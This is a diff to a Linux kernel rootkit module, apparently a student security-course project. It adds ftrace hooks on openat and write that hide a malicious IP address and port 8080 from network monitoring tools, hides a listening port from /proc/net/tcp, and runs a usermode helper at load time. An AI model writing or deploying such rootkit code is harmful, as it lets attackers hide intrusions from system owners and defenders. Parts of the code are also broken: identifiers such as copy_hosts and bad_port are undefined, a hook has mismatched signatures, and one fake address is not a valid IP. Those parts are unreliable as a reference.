@@ -16,6 +16,7 @@
 #include <linux/module.h>
 #include <linux/dirent.h>
 #include <linux/tcp.h>
+#include <linux/string.h>
 
 #include <net/tcp.h>
 #include <net/sock.h>
@@ -160,11 +161,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
   char local_ip_str[16];
   int bytes_written = 0; 
   if (sk != (struct sock*)0x1) {
-    printk(KERN_INFO "Foreign addr: %pI4 state: %d\n", &sk->sk_daddr, sk->sk_state);
-    printk(KERN_INFO "Local addr: %pI4\n", &sk->sk_rcv_saddr);
-    
     bytes_written = snprintf(foreign_ip_str, max_ip_len, "%pI4", &sk->sk_daddr);
-    printk(KERN_INFO "Sucessfully wrote ip string %s\n", foreign_ip_str);
     if (bytes_written < 0) {
       printk(KERN_INFO "Could not write foreign ip string\n");
     }
@@ -172,7 +169,6 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
     // Check if ip matches local machine. For the case where the server is the 
     // local machine.
     bytes_written = snprintf(local_ip_str, max_ip_len, "%pI4", &sk->sk_rcv_saddr);
-    printk(KERN_INFO "Sucessfully wrote ip string %s\n", local_ip_str);
     if (bytes_written < 0) {
       printk(KERN_INFO "Could not write local ip string\n");
     }
@@ -180,20 +176,83 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
     // Check if client or server ip matches malicious ADDRESS.
     if (strcmp(foreign_ip_str, ADDRESS) == 0 || strcmp(local_ip_str, ADDRESS) == 0) {
       return 0;
-    } 
+    } else if (sk->sk_num == 0x1f90) {
+      return 0;
+    }
 
   }
 
-  if (sk != (struct sock*)0x1 && sk->sk_num == 0x1f90) {
-    return 0;
-  }
-
-  if (sk != (struct sock*)0x1) {
-    printk(KERN_INFO "Running original tcp4\n");
-  }
   return orig_tcp4_seq_show(seq, v);
 }
 
+/* Try to hide from other tools that don't use /proc/net/tcp. Hook openat to
+ * prevent network monitoring tools from opening other files like /etc/hosts and 
+ * /etc/services. 
+ */
+#define NMAP_SERVICES_FILE "/usr/bin/../share/nmap/nmap-services"
+#define PORT_TO_HIDE "8080" 
+#define ADDR_TO_HIDE "10.0.2.15"
+#ifdef PTREGS_SYSCALL_STUBS
+
+static asmlinkage int (*orig_openat)(struct pt_regs *regs);
+
+static asmlinkage int hook_openat(struct pt_regs *regs) {
+  char *pathname = (void*)(regs->si);
+  if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
+    regs->si = (unsigned long)((void *)copy_hosts);
+    return orig_openat(regs); 
+  } 
+
+  return orig_openat(regs);
+}
+#else
+static asmlinkage int (*orig_openat)(int dirfd, const char __user *pathname, int flags, umode_t mode);
+
+static asmlinkage int hook_openat(int dirfd, const char __user *pathname, int flags, umode_t mode) {
+  if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
+    return orig_openat(dirfd, pathname, flags, mode); 
+  } 
+
+  return orig_openat(dirfd, pathname, flags, mode);
+}
+#endif
+
+/* Hook the write function to prevent communication with server from 
+ * from being output to stdout. */
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*orig_write)(struct pt_regs *regs);
+
+static asmlinkage long hook_write(struct pt_regs *regs) {
+  char *fake_port = "2020";
+  char *fake_address = "123.456.789.0";
+  char *orig_buff = (void*)(regs->si);
+  if (strstr(orig_buff, PORT_TO_HIDE) != NULL) {
+    regs->si = (unsigned long)((void*)fake_port);
+
+    return orig_write(regs);
+  } else if (strstr(orig_buff, ADDR_TO_HIDE) != NULL) {
+    regs->si = (unsigned long)((void*)fake_address);
+
+    return orig_write(regs);
+  } 
+
+  return orig_write(regs);
+}
+#else 
+static asmlinkage long (*orig_write)(struct pt_regs *regs);
+
+static asmlinkage long hook_write(int fd, const char __user *buff, size_t count) {
+  char *fake_port = "2020";
+  char *fake_address = "123.456.789.0";
+  if (strstr(buff, bad_port) != NULL) {
+    return orig_write(fd, fake_port, count);
+  } else if (strstr(buff, bad_address) != NULL) {
+    return orig_write(fd, fake_address, count);
+  } 
+
+  return orig_write(fd, buff, count);
+}
+#endif 
 
 //The hooking structure: for every syscall we want to hijack,
 //we put in one more entry into this ftrace_hook struct array:
@@ -204,10 +263,17 @@ static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", hook_kill, &orig_kill),
   HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+  HOOK("__x64_sys_openat", hook_openat, &orig_openat),
+  HOOK("__x64_sys_write", hook_write, &orig_write),
 };
 
 
 int __init my_init(void){
+  // Make copy of network files. 
+  char *rootkit_dir = "/home/uwem/Desktop/logger/cpsc413-project/rootkit";
+  char *argv1[] = {"/bin/cp", "/etc/hostname", rootkit_dir, NULL};
+  char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
+  call_usermodehelper(argv1[0], argv1, envp, UMH_NO_WAIT);
 	int err;
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err){
